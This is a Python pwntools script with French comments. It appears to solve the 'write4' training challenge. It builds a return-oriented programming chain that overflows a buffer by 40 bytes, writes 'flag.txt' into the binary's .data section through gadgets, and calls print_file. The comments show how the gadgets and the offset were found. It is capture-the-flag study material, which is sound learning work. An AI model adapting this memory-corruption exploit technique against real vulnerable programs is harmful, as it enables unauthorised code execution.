from pwn import *

# But de la ROP chain :
# 
# Appeler print_file() mais avec l'argument "flag.txt"
# Le problème est que cette chaîne n'est pas présente nativement dans le binaire
# Il faut donc réussir à l'écrire en mémoire au runtime avec un gadget

context.bits = 64

ecriture_r14 = p64(0x400628)
# ROPgadget --binary ./write4 | grep "mov.*\["
#
#    0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
#    0x0000000000400629 : mov dword ptr [rsi], edi ; ret
#    0x0000000000400628 : mov qword ptr [r14], r15 ; ret
#
# Le seul gadget qui écrit 8 octets d'un coup est celui qui écrit le contenu de r15 à l'adresse pointée par r14

pop_registres = p64(0x400690)
# ROPgadget --binary ./write4 | grep "pop r14"
# => 0x0000000000400690 : pop r14 ; pop r15 ; ret

print_file = p64(0x400510)
# gdb-peda$ disass print_file
# => 0x0000000000400510 <+0>:     jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>

pop_rdi = p64(0x400693)
# ROPgadget --binary ./write4 | grep "pop rdi"
# Il faut inspecter la fonction dans l'autre fichier libwrite4.so pour confirmer que c'est bien RDI qui est utilisé

section_rw = p64(0x601028)
# gdb-peda$ maintenance info sections
# => [22]     0x00601028->0x00601038 at 0x00001028: .data ALLOC LOAD DATA HAS_CONTENTS
# => [23]     0x00601038->0x00601040 at 0x00001038: .bss ALLOC
#
# Nécessité de trouver une section stable et sans restriction où écrire le "flag.txt"
# Et accessible en lecture pour que print_file() puisse lire juste après

payload = b'A' * 40 + pop_registres + section_rw + b'flag.txt' + ecriture_r14 + pop_rdi + section_rw + print_file
# Obtention du 40 :
#    msf-pattern_create -l 500
#    gdb-peda$ run < cyclic500.txt
#    gdb-peda$ bt
#    msf-pattern_offset -q 0x35624134 -l 500

p = process("./write4")

p.send(payload)
print(p.recvall().decode('utf-8'))
